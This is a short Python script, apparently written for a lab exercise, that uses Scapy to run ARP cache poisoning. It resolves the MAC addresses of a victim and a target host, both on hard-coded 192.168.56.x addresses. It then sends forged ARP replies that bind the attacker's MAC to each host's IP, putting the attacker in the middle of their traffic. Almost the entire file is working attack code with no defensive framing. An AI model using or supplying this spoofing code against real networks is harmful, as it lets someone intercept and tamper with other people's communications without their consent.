from scapy.all import *
from Functions import Functions

functions = Functions()
def ARPPoisoning(ipVictim, ipToSpoof, networkID):
    macAttacker = get_if_hwaddr(networkID)
    macVictim = functions.retrieveMACAdress("enp0s3", "192.168.56.101")
    macSpoof = functions.retrieveMACAdress("enp0s3", "192.168.56.102")
    print("Mac attacker: " + macAttacker)
    print("Mac victim: " + macVictim)
    print("Mac spoof: " + macSpoof)
    if macSpoof == None or macAttacker == None or macVictim == None:
        print("Error!")
        sys.exit()

    victimPkt = Ether() / ARP()
    victimPkt[Ether].src = macAttacker
    victimPkt[ARP].hwsrc = macAttacker
    victimPkt[ARP].psrc = ipToSpoof
    victimPkt[ARP].hwdst = macVictim
    victimPkt[ARP].pdst = ipVictim
    sendp(victimPkt, iface = networkID, verbose = 0)

    spoofPkt = Ether() / ARP()
    spoofPkt[Ether].src = macAttacker
    spoofPkt[ARP].hwsrc = macAttacker
    spoofPkt[ARP].psrc = ipVictim
    spoofPkt[ARP].hwdst = macSpoof
    spoofPkt[ARP].pdst = ipToSpoof

    sendp(spoofPkt, iface = networkID, verbose = 0)
